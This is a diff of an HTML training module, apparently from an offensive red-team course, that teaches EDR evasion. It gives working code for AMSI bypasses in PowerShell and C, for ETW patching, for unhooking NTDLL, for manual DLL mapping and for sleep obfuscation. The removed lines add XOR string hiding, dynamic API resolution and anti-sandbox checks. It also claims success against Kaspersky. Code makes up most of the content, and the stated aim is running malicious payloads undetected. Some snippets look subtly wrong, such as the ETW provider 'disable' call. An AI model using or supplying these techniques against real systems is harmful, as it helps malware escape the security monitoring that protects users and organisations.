+                </tr>
+            </table>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Limitations of HWBP</h5>
+            <p>Hardware breakpoints are <span class="neon-amber">per-thread</span> and limited to 4 active breakpoints. If the EDR creates a new thread to scan your code, the HWBP won't fire (unless you set it on every thread). Some EDRs also detect debug register manipulation via kernel callbacks. Dark Room is powerful but not invincible.</p>
+        </div>
+
+        <!-- ==================== SECTION 6: AMSI BYPASS ==================== -->
+        <h2 id="amsi">6. AMSI Bypass — Killing the Script Scanner</h2>
+
+        <p><span class="neon-highlight">AMSI</span> (Antimalware Scan Interface) is Windows' built-in script scanner. When you run PowerShell, JScript, VBScript, or macros, AMSI intercepts the script content and sends it to the registered antivirus for analysis. Bypassing AMSI is essential for running malicious scripts undetected.</p>
+
+        <div class="step-box">
+            <h4>How AMSI Works</h4>
+            <p>AMSI is a COM interface loaded into scripting hosts. When PowerShell executes a command, it calls <code>AmsiScanBuffer</code> with the script content. The AV engine analyzes it and returns <code>AMSI_RESULT_CLEAN</code> (0) or <code>AMSI_RESULT_DETECTED</code> (32768).</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// AMSI scan flow:</span>
+PowerShell → amsi.dll!AmsiScanBuffer(script_content)
+    → amsi.dll forwards to registered AV provider
+    → AV scans content
+    → Returns: 0 (CLEAN) or 32768 (DETECTED)
+    → If DETECTED: PowerShell blocks execution
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Method 1: AMSI Context Patch (In-Memory)</h4>
+            <p>The most reliable AMSI bypass patches the <code>AMSI_CONTEXT</code> structure in memory, setting the scan result to "clean" before any real scan occurs. This works because AMSI trusts the context state.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// PowerShell AMSI bypass (memory patch):</span>
+$a = [Ref].Assembly.GetTypes() | ForEach-Object {
+    if ($_.Name -like "*iUtils") { $_ }
+}
+$b = $a.GetFields('NonPublic,Static')
+$b | ForEach-Object {
+    if ($_.Name -like "*Context") { $c = $_ }
+}
+
+<span class="neon-highlight">// Set AMSI session to "clean":</span>
+[IntPtr]$ptr = $c.GetValue($null)
+[Int32[]]$buf = @(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+<span class="neon-highlight">// Result: AMSI context is now 0 (clean). All scans pass.</span>
+            </div>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>AMSI maintains a session context that stores the scan state. By setting the context's internal state to 0, we tell AMSI "this session has already been scanned and found clean." Subsequent scans are skipped. This is faster and more reliable than patching <code>AmsiScanBuffer</code> directly.</p>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Method 2: AmsiScanBuffer Patch (Classic)</h4>
+            <p>The classic AMSI bypass patches the <code>AmsiScanBuffer</code> function to always return <code>AMSI_RESULT_CLEAN</code>. This is more detectable (modifies .text section) but works across all AMSI versions.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// C implementation of AMSI bypass:</span>
+#include &lt;windows.h&gt;
+
+BOOL BypassAmsi() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) return FALSE;
+
+    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) return FALSE;
+
+    <span class="neon-highlight">// Patch: mov eax, 0x80070057 (E_INVALIDARG)
+    //       ret</span>
+    // This causes AMSI to return "invalid argument" — which
+    // PowerShell treats as "no scan needed, continue"
+
+    BYTE patch[] = {
+        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
+        0xC3                           // ret
+    };
+
+    DWORD oldProtect;
+    VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
+
+    return TRUE;
+}
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Method 3: AMSI DLL Unload (Stealthy)</h4>
+            <p>Instead of patching, we can unload the AMSI DLL from the process. Without amsi.dll loaded, PowerShell cannot scan scripts. This is stealthier than patching but may cause PowerShell errors if AMSI is expected.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// PowerShell: Unload AMSI from current process:</span>
+$AMSI = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+$Field = $AMSI.GetField("amsiInitFailed", "NonPublic,Static")
+$Field.SetValue($null, $true)
+
+<span class="neon-highlight">// This sets the internal "AMSI init failed" flag.
+// PowerShell thinks AMSI is unavailable and skips all scans.</span>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ AMSI bypass detection</h5>
+            <p>Modern EDRs detect AMSI bypasses by:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li>Monitoring <code>VirtualProtect</code> on <code>amsi.dll</code> memory regions</li>
+                <li>Checking <code>AmsiScanBuffer</code> integrity via hashes</li>
+                <li>Using kernel callbacks to detect .text modifications</li>
+                <li>Behavioral: "PowerShell + memory write to AMSI = suspicious"</li>
+            </ul>
+            <p style="margin-top: 0.5rem;">Combine AMSI bypass with <span class="neon-highlight">sleep obfuscation</span> and <span class="neon-highlight">indirect syscalls</span> to reduce detection risk.</p>
+        </div>
+
+        <!-- ==================== SECTION 7: ETW BYPASS ==================== -->
+        <h2 id="etw">7. ETW Bypass — Silencing the Windows Logger</h2>
+
+        <p><span class="neon-highlight">ETW</span> (Event Tracing for Windows) is the OS-wide telemetry system. Security providers subscribe to ETW events to detect suspicious activity: process creation, network connections, registry changes, API calls. Bypassing ETW reduces the telemetry available to EDR and SIEM systems.</p>
+
+        <div class="step-box">
+            <h4>ETW Architecture</h4>
+            <p>ETW has three components: <strong>Providers</strong> (emit events), <strong>Consumers</strong> (receive events), and <strong>Controllers</strong> (start/stop sessions). Security EDRs act as consumers, subscribing to events from the Microsoft-Windows-Threat-Intelligence provider and others.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// ETW event flow:</span>
+Application / Kernel → ETW Provider
+    → ETW Session (in-memory buffer)
+    → ETW Consumer (EDR agent)
+    → EDR Cloud / SIEM
+
+<span class="neon-highlight">// Key ETW providers for security:</span>
+Microsoft-Windows-Threat-Intelligence   → Process injection, API calls
+Microsoft-Windows-PowerShell             → PowerShell execution
+Microsoft-Windows-Sysmon                 → File, network, registry
+Microsoft-Windows-Kernel-Process         → Process/thread events
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Method 1: ETW Patching (NtTraceEvent)</h4>
+            <p>The simplest ETW bypass patches <code>NtTraceEvent</code> in NTDLL. This function is the gateway for all ETW events from user-mode. If it returns success without doing anything, no events are logged.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// C ETW bypass via NtTraceEvent patch:</span>
+#include &lt;windows.h&gt;
+
+BOOL BypassETW() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    PVOID pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
+
+    <span class="neon-highlight">// Patch: xor eax, eax; ret
+    // Returns STATUS_SUCCESS (0) without logging anything:</span>
+    BYTE patch[] = { 0x33, 0xC0, 0xC3 };  // xor eax, eax; ret
+
+    DWORD oldProtect;
+    VirtualProtect(pNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(pNtTraceEvent, patch, sizeof(patch));
+    VirtualProtect(pNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);
+
+    return TRUE;
+}
+
+<span class="neon-highlight">// Result: All ETW events from this process are silently dropped.</span>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Method 2: ETW Provider Disable (BlockTrace)</h4>
+            <p>Instead of patching the global gateway, we can disable specific ETW providers. This is more targeted — we silence only the security providers, leaving system logging intact (less noisy).</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// PowerShell: Disable ETW provider by GUID:</span>
+$Provider = [System.Guid]::Parse("{GUID_OF_THREAT_INTELLIGENCE_PROVIDER}")
+$EventLog = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration "Security"
+
+<span class="neon-highlight">// Or use wevtutil to disable a provider:</span>
+wevtutil.exe sl Microsoft-Windows-Threat-Intelligence /e:false
+
+<span class="neon-highlight">// C: Use EventWrite to block specific provider:</span>
+#include &lt;evntprov.h&gt;
+
+BOOL DisableETWProvider(LPCGUID ProviderGuid) {
+    REGHANDLE hReg = 0;
+    EventRegister(ProviderGuid, NULL, NULL, &hReg);
+    EventUnregister(hReg);  // Unregistering stops the provider
+    return TRUE;
+}
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Method 3: ETW Session Hijacking</h4>
+            <p>Advanced: ETW sessions are named and shared. If we can find the EDR's ETW session name, we can stop it or redirect its output to a null consumer. This requires admin privileges but is extremely effective.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// Enumerate ETW sessions and find the EDR's:</span>
+#include &lt;windows.h&gt;
+#include &lt;evntcons.h&gt;
+
+VOID ListETWSessions() {
+    ULONG bufferSize = 0;
+    ULONG sessionCount = 0;
+
+    <span class="neon-highlight">// First call: get required buffer size:</span>
+    ControlTrace(0, NULL, NULL, EVENT_TRACE_CONTROL_QUERY);
+
+    <span class="neon-highlight">// Enumerate all sessions:</span>
+    PEVENT_TRACE_PROPERTIES sessions = HeapAlloc(GetProcessHeap(), 0, bufferSize);
+    EnumerateTraceGuids(NULL, 0, &sessionCount);  // Simplified
+
+    <span class="neon-highlight">// Look for EDR-specific session names:</span>
+    // "CrowdStrike", "SentinelOne", "Sysmon", "Microsoft-Windows-Threat-Intelligence"
+}
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why ETW bypass is critical</h5>
+            <p>Even if you bypass AMSI and user-mode hooks, ETW still logs your behavior to the EDR. A single <code>CreateRemoteThread</code> call generates an ETW event. The EDR's cloud backend correlates this with other events and flags you. Silencing ETW removes the evidence trail.</p>
+        </div>
+
+        <!-- ==================== SECTION 8: UNHOOKING NTDLL ==================== -->
+        <h2 id="unhook">8. Unhooking NTDLL — Restoring the Original Gate</h2>
+
+        <p>If the EDR has patched NTDLL with inline hooks, one powerful evasion is to <span class="neon-highlight">unhook</span> NTDLL — restore the original bytes from a clean copy. This gives you a pristine syscall gateway for the rest of your operation.</p>
+
+        <div class="step-box">
+            <h4>The Unhooking Process</h4>
+            <p>EDR hooks modify NTDLL in memory. But the original NTDLL still exists on disk (and in the <code>\KnownDlls\</code> section object). We can read the original bytes and overwrite the hooked version.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// Step 1: Read clean NTDLL from disk:</span>
+HANDLE hFile = CreateFileA(
+    "C:\\Windows\\System32\\ntdll.dll",
+    GENERIC_READ,
+    FILE_SHARE_READ,
+    NULL,
+    OPEN_EXISTING,
+    0,
+    NULL
+);
+
+HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+PVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+
+<span class="neon-highlight">// Step 2: Get the loaded (hooked) NTDLL:</span>
+PVOID pHookedNtdll = GetModuleHandleA("ntdll.dll");
+
+<span class="neon-highlight">// Step 3: Copy .text section from clean to hooked:</span>
+PIMAGE_NT_HEADERS ntClean = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + ((PIMAGE_DOS_HEADER)pCleanNtdll)->e_lfanew);
+PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntClean);
+
+for (int i = 0; i < ntClean->FileHeader.NumberOfSections; i++) {
+    if (strcmp((char*)section[i].Name, ".text") == 0) {
+        DWORD oldProtect;
+        VirtualProtect(
+            (BYTE*)pHookedNtdll + section[i].VirtualAddress,
+            section[i].Misc.VirtualSize,
+            PAGE_EXECUTE_READWRITE,
+            &oldProtect
+        );
+
+        memcpy(
+            (BYTE*)pHookedNtdll + section[i].VirtualAddress,
+            (BYTE*)pCleanNtdll + section[i].VirtualAddress,
+            section[i].Misc.VirtualSize
+        );
+
+        VirtualProtect(
+            (BYTE*)pHookedNtdll + section[i].VirtualAddress,
+            section[i].Misc.VirtualSize,
+            oldProtect,
+            &oldProtect
+        );
+        break;
+    }
+}
+
+<span class="neon-highlight">// Result: NTDLL is now unhooked. All syscalls go directly to kernel.</span>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Detection risks of unhooking</h5>
+            <p>Unhooking NTDLL is a <span class="neon-highlight">highly suspicious</span> operation. EDRs monitor for:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li><code>VirtualProtect</code> on NTDLL memory regions</li>
+                <li>Memory writes to <code>ntdll.dll</code> from non-system processes</li>
+                <li>Integrity checks: comparing in-memory NTDLL to disk hash</li>
+                <li>Behavioral correlation: unhooking + process injection = critical alert</li>
+            </ul>
+            <p style="margin-top: 0.5rem;">Use <span class="neon-amber">indirect syscalls</span> or <span class="neon-amber">manual mapping</span> instead of unhooking when possible. Unhooking is a last resort.</p>
+        </div>
+
+        <!-- ==================== SECTION 9: MANUAL MAPPING ==================== -->
+        <h2 id="mapping">9. Manual Mapping — Loading Without the Loader</h2>
+
+        <p><span class="neon-highlight">Manual mapping</span> is the process of loading a DLL into memory without using the Windows loader (<code>LoadLibrary</code>). This bypasses the EDR's image load callbacks, API monitoring, and IAT hooks. The EDR sees no <code>LoadLibrary</code> call, no PE header registration, and no module in the PEB module list.</p>
+
+        <div class="step-box">
+            <h4>Why Manual Mapping Evasion</h4>
+            <p>When you call <code>LoadLibrary("evil.dll")</code>, Windows:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li>Calls kernel callbacks (PsSetLoadImageNotifyRoutine) — EDR sees it</li>
+                <li>Adds the module to the PEB module list — EDR enumerates it</li>
+                <li>Resolves imports through the IAT — EDR hooks are applied</li>
+                <li>Calls DLL entry point (DllMain) — EDR can intercept</li>
+            </ul>
+            <p style="margin-top: 0.5rem;">Manual mapping does none of this. The DLL exists in memory as raw bytes, invisible to standard enumeration.</p>
+        </div>
+
+        <div class="step-box">
+            <h4>Manual Mapping Steps</h4>
+
+            <div class="code-block">
+<span class="neon-highlight">// 1. Read the DLL file into memory:</span>
+HANDLE hFile = CreateFileA("evil.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+DWORD fileSize = GetFileSize(hFile, NULL);
+BYTE* fileBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);
+ReadFile(hFile, fileBuffer, fileSize, &read, NULL);
+
+<span class="neon-highlight">// 2. Parse PE headers:</span>
+PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileBuffer;
+PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(fileBuffer + dos->e_lfanew);
+
+<span class="neon-highlight">// 3. Allocate memory for the mapped image:</span>
+BYTE* mappedImage = (BYTE*)VirtualAlloc(
+    NULL,
+    nt->OptionalHeader.SizeOfImage,
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE
+);
+
+<span class="neon-highlight">// 4. Copy headers and sections:</span>
+memcpy(mappedImage, fileBuffer, nt->OptionalHeader.SizeOfHeaders);
+PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+    memcpy(
+        mappedImage + section[i].VirtualAddress,
+        fileBuffer + section[i].PointerToRawData,
+        section[i].SizeOfRawData
+    );
+}
+
+<span class="neon-highlight">// 5. Process relocations (if base address differs):</span>
+PIMAGE_DATA_DIRECTORY relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(mappedImage + relocDir->VirtualAddress);
+DWORD_PTR delta = (DWORD_PTR)mappedImage - nt->OptionalHeader.ImageBase;
+
+<span class="neon-highlight">// 6. Resolve imports manually (bypass IAT hooks):</span>
+PIMAGE_DATA_DIRECTORY importDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(mappedImage + importDir->VirtualAddress);
+
+while (import->Name) {
+    HMODULE hMod = LoadLibraryA((char*)(mappedImage + import->Name));
+    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(mappedImage + import->FirstThunk);
+    // ... resolve each import via GetProcAddress(hMod, name)
+    import++;
+}
+
+<span class="neon-highlight">// 7. Call DLL entry point (optional, risky):</span>
+typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
+DllMain_t entry = (DllMain_t)(mappedImage + nt->OptionalHeader.AddressOfEntryPoint);
+entry((HINSTANCE)mappedImage, DLL_PROCESS_ATTACH, NULL);
+
+<span class="neon-highlight">// Result: DLL is loaded in memory but NOT in PEB module list.
+// EDR image load callbacks never fired. Invisible to enumeration.</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Manual Mapping vs LoadLibrary</h4>
+            <table>
+                <tr>
+                    <th>Attribute</th>
+                    <th>LoadLibrary</th>
+                    <th>Manual Mapping</th>
+                </tr>
+                <tr>
+                    <td>PEB Module List</td>
+                    <td>Visible</td>
+                    <td><span class="neon-highlight">Invisible</span></td>
+                </tr>
+                <tr>
+                    <td>Kernel Callbacks</td>
+                    <td>Fires</td>
+                    <td><span class="neon-highlight">Skipped</span></td>
+                </tr>
+                <tr>
+                    <td>IAT Hooks</td>
+                    <td>Applied by EDR</td>
+                    <td><span class="neon-highlight">Bypassed</span></td>
+                </tr>
+                <tr>
+                    <td>Import Resolution</td>
+                    <td>Windows loader</td>
+                    <td>Manual (controlled)</td>
+                </tr>
+                <tr>
+                    <td>Relocations</td>
+                    <td>Automatic</td>
+                    <td>Manual</td>
+                </tr>
+                <tr>
+                    <td>Complexity</td>
+                    <td>1 API call</td>
+                    <td><span class="neon-amber">~200 lines</span></td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="why-box">
+            <h5>Why manual mapping is the gold standard</h5>
+            <p>Manual mapping combines multiple evasion techniques into one: no module list visibility, no kernel callbacks, no IAT hooks, and full control over import resolution. It's the technique used by advanced loaders like <span class="neon-highlight">Donut</span> and <span class="neon-highlight">Sliver</span>. The trade-off is complexity — you become your own PE loader.</p>
+        </div>
+
+        <!-- ==================== SECTION 10: SLEEP OBFUSCATION ==================== -->
+        <h2 id="sleep">10. Sleep Obfuscation — Encrypting While Dormant</h2>
+
+        <p>When malware sleeps between C2 beacons, it's vulnerable. EDR memory scanners can inspect the process, find your payload, and flag it. <span class="neon-highlight">Sleep obfuscation</span> encrypts the malware's memory while sleeping, decrypting only when awake. To the scanner, the memory looks like random noise.</p>
+
+        <div class="step-box">
+            <h4>The Sleep Obfuscation Cycle</h4>
+
+            <div class="injection-flow">
+                <div class="inj-step">
+                    <h5>ACTIVE</h5>
+                    <p>Payload decrypted in RWX memory</p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">EDR can scan and detect</p>
+                </div>
+                <div class="inj-arrow">→</div>
+                <div class="inj-step">
+                    <h5>ENCRYPT</h5>
+                    <p>XOR/AES encrypt payload</p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">Change memory to RW</p>
+                </div>
+                <div class="inj-arrow">→</div>
+                <div class="inj-step">
+                    <h5>SLEEP</h5>
+                    <p>Wait for beacon interval</p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">Memory is encrypted garbage</p>
+                </div>
+                <div class="inj-arrow">→</div>
+                <div class="inj-step">
+                    <h5>DECRYPT</h5>
+                    <p>Restore RWX, decrypt payload</p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">Resume execution</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Implementation: Ekko / Foliage Technique</h4>
+            <p>The <span class="neon-highlight">Ekko</span> technique (by Peter Winter-Smith) and <span class="neon-highlight">Foliage</span> use <code>WaitForSingleObject</code> with a timer and <code>NtContinue</code> to create a ROP chain that encrypts memory, sleeps, then decrypts and resumes — all without leaving a clear execution trace.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// Simplified sleep obfuscation (C):</span>
+#include &lt;windows.h&gt;
+#include &lt;intrin.h&gt;
+
+VOID SleepObfuscate(DWORD dwMilliseconds) {
+    <span class="neon-highlight">// 1. Save context (registers, stack):</span>
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_FULL;
+    RtlCaptureContext(&ctx);
+
+    <span class="neon-highlight">// 2. Encrypt payload memory:</span>
+    PVOID payloadBase = GetModuleHandleA(NULL);  // Or your payload section
+    SIZE_T payloadSize = 0x10000;               // Size of payload
+
+    DWORD oldProtect;
+    VirtualProtect(payloadBase, payloadSize, PAGE_READWRITE, &oldProtect);
+
+    <span class="neon-highlight">// XOR encrypt with rotating key:</span>
+    BYTE key = 0xAB;
+    for (SIZE_T i = 0; i < payloadSize; i++) {
+        ((BYTE*)payloadBase)[i] ^= key;
+        key = _rotl8(key, 1);
+    }
+
+    <span class="neon-highlight">// 3. Sleep:</span>
+    Sleep(dwMilliseconds);
+
+    <span class="neon-highlight">// 4. Decrypt payload memory:</span>
+    key = 0xAB;
+    for (SIZE_T i = 0; i < payloadSize; i++) {
+        ((BYTE*)payloadBase)[i] ^= key;
+        key = _rotl8(key, 1);
+    }
+
+    VirtualProtect(payloadBase, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
+
+    <span class="neon-highlight">// 5. Restore and continue:</span>
+    NtContinue(&ctx, FALSE);  // Resume execution
+}
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Advanced: Using ROP + APC for Timer-Based Sleep</h4>
+            <p>The most advanced sleep obfuscation uses <code>QueueUserAPC</code> with a timer and a ROP chain. The ROP chain encrypts memory, sets up a timer, and when the timer fires, another ROP chain decrypts and resumes. The main thread never appears to "sleep" — it's just not executing.</p>
+
+            <div class="code-block">
+<span class="neon-highlight">// Ekko-style sleep obfuscation (conceptual):</span>
+<span class="neon-highlight">// 1. Create a timer queue:</span>
+HANDLE hTimerQueue = CreateTimerQueue();
+
+<span class="neon-highlight">// 2. Build ROP chain on stack:</span>
+<span class="neon-highlight">//    - Encrypt memory (VirtualProtect + XOR loop)</span>
+<span class="neon-highlight">//    - Wait (WaitForSingleObject on timer)</span>
+<span class="neon-highlight">//    - Decrypt memory (XOR loop + VirtualProtect)</span>
+<span class="neon-highlight">//    - Resume (NtContinue to saved context)</span>
+
+<span class="neon-highlight">// 3. Queue APC with ROP chain:</span>
+QueueUserAPC((PAPCFUNC)ROP_CHAIN, GetCurrentThread(), (ULONG_PTR)ctx);
+
+<span class="neon-highlight">// 4. Enter alertable wait:</span>
+SleepEx(INFINITE, TRUE);  // Alertable wait — APC fires
+
+<span class="neon-highlight">// Result: Execution flows through ROP, no clear "sleep" in call stack.</span>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Sleep obfuscation caveats</h5>
+            <p>Sleep obfuscation is powerful but has limitations:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li><strong>Key storage:</strong> The XOR key must be stored somewhere. If the EDR finds it, decryption is trivial.</li>
+                <li><strong>Memory scanners:</strong> Some EDRs scan memory continuously, not just during sleep. Encrypting only during sleep isn't enough.</li>
+                <li><strong>ROP detection:</strong> Advanced EDRs detect ROP chains and stack pivots. The Ekko technique may trigger "exploit behavior" heuristics.</li>
+                <li><strong>Thread hiding:</strong> Combine with thread hiding (Module 11: Rootkits) for maximum stealth.</li>
+            </ul>
+        </div>
+
+        <!-- ==================== SECTION 11: 8-LAYER STACK ==================== -->
+        <h2 id="stack">11. The 8-Layer Evasion Stack</h2>
+
+        <p>Real-world EDR evasion is not a single technique — it's a <span class="neon-highlight">stack of layers</span>. Each layer catches what the previous layer missed. This is the stack used in the Iron Sun project, tested live against Kaspersky 21.25.</p>
 
         <div class="evasion-stack">
             <div class="evasion-layer">
@@ -231,6 +1495,12 @@
             </div>
         </div>
 
+        <div class="why-box">
+            <h5>Why layers matter</h5>
+            <p>Each layer addresses a different detection vector. XOR obfuscation defeats static signatures. Dynamic APIs defeat IAT analysis. Anti-sandbox defeats automated analysis. PE header stomp defeats YARA rules. Auth gates defeat unauthorized execution. Beacon jitter defeats timing heuristics. MinGW defeats compiler signatures. HWBP defeats runtime scanners. Remove any layer and the whole stack weakens.</p>
+        </div>
+
+        <!-- ==================== LIVE EVIDENCE ==================== -->
         <h2>Live Evidence: Iron Sun vs KAV</h2>
 
         <div class="evidence-box">
@@ -259,106 +1529,94 @@ CLEAN — All 8 evasion layers passed Kaspersky static analysis
             <p style="margin-top: 1rem;"><strong>Why it passed:</strong> No suspicious strings in binary (XOR encrypted). No suspicious imports (dynamic resolution). No known signatures (custom code, not Metasploit). No behavioral triggers (anti-sandbox gates).</p>
         </div>
 
-        <h2>Layer-by-Layer Breakdown</h2>
+        <!-- ==================== CROSS-LINKS ==================== -->
+        <h2>🔗 Cross-Module References</h2>
 
-        <div class="step-box">
-            <h4>Layer 1: XOR Obfuscation</h4>
-            <p>Strings like "cmd.exe" and "ws2_32.dll" are signatures. We encrypt them at compile time and decrypt at runtime.</p>
+        <p>EDR evasion builds on techniques from earlier modules. Master these first:</p>
 
-            <div class="code-block">
-// Compile-time XOR encryption
-#define XOR_KEY 0xB5
-
-// "cmd.exe" encrypted with XOR 0xB5
-unsigned char cmd[] = {0xF6, 0xF0, 0xF7, 0xD4, 0xF0, 0xF1, 0x00};
-
-void decrypt(char* data, size_t len) {
-    for (size_t i = 0; i < len; i++) {
-        data[i] ^= XOR_KEY;
-    }
-}
-
-// Usage:
-decrypt(cmd, sizeof(cmd));
-// Now cmd contains "cmd.exe"
-WinExec(cmd, 0);  // AV string scan sees garbage, not "cmd.exe"
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Direct syscalls and manual mapping are essential for process injection without EDR detection. The injection kill chain (Open → Allocate → Write → Execute) is the same — but now we bypass the hooks at each step.</p>
             </div>
-
-            <div class="why-box">
-                <h5>Why XOR and not AES?</h5>
-                <p>XOR is reversible with the same operation. No key schedule, no IV, no padding. One byte of code, one byte decrypted. AES would add a library dependency (crypt32.dll) — another signature.</p>
+            <div class="method-card">
+                <h4><a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a></h4>
+                <p>Kernel-mode rootkits can disable EDR drivers, patch SSDT, and hide processes. User-mode evasion (this module) is safer but less powerful. Combine both for maximum stealth.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>Understanding how EDR detects malware helps you evade it. Module 12 covers YARA rules, memory forensics, and behavioral analysis — the exact techniques you're evading here.</p>
             </div>
         </div>
 
-        <div class="step-box">
-            <h4>Layer 2: Dynamic API Resolution</h4>
-            <p>Instead of listing imports in the PE header, we resolve them at runtime using GetProcAddress.</p>
-
-            <div class="code-block">
-// Instead of linking at compile time:
-// #pragma comment(lib, "ws2_32.lib")
-// We resolve at runtime:
-
-HMODULE hWs2 = LoadLibraryA("ws2_32.dll");  // "ws2_32.dll" is XOR encrypted
-FARPROC pSocket = GetProcAddress(hWs2, "socket");  // "socket" is XOR encrypted
-FARPROC pConnect = GetProcAddress(hWs2, "connect");
-
-// Now we can call socket() without it appearing in the IAT
-// AV static analysis: "This program imports nothing suspicious"
-// Reality: It resolves everything at runtime
-            </div>
+        <div class="why-box">
+            <h5>The Red Team Loop</h5>
+            <p>Module 10 (inject) → Module 11 (hide) → Module 12 (detect) → Module 13 (evade) → Module 14 (persist). Each module feeds the next. A red team operator who masters all four can inject, hide, understand detection, and evade it — the complete offensive cycle.</p>
         </div>
 
-        <div class="step-box">
-            <h4>Layer 3: Anti-Sandbox</h4>
-            <p>Sandboxes (Cuckoo, ANY.RUN) run malware in VMs to analyze behavior. We detect the VM and exit.</p>
+        <!-- ==================== QUIZZES ==================== -->
+        <h2 id="quizzes">12. Interactive Quizzes</h2>
 
-            <div class="code-block">
-// Anti-sandbox checks:
-
-// 1. RAM check — VMs often have < 2GB
-MEMORYSTATUSEX mem;
-mem.dwLength = sizeof(mem);
-GlobalMemoryStatusEx(&mem);
-if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
-    exit(0);  // Less than 2GB RAM = probably VM
-}
-
-// 2. CPU check — VMs often have 1-2 cores
-SYSTEM_INFO si;
-GetSystemInfo(&si);
-if (si.dwNumberOfProcessors < 2) {
-    exit(0);  // Single core = probably VM
-}
-
-// 3. Timing check — VMs are slow
-DWORD start = GetTickCount();
-Sleep(5000);
-DWORD elapsed = GetTickCount() - start;
-if (elapsed < 4000) {
-    exit(0);  // Sleep returned early = time acceleration detected
-}
+        <div class="quiz-container" id="quiz1">
+            <h3>Quiz 1: Syscall Architecture</h3>
+            <p><strong>Question:</strong> Why do direct syscalls bypass user-mode EDR hooks?</p>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz1')">
+                A. They use a different CPU instruction (sysenter instead of syscall)
             </div>
-
-            <div class="warning-box">
-                <h5>⚠️ The sandbox arms race</h5>
-                <p>Modern sandboxes have 8GB RAM, 4 cores, and patch timing functions. Layer 3 alone is not enough. Combine with other layers for defense in depth.</p>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz1')">
+                B. They skip NTDLL entirely and call the kernel directly from the malware's code
             </div>
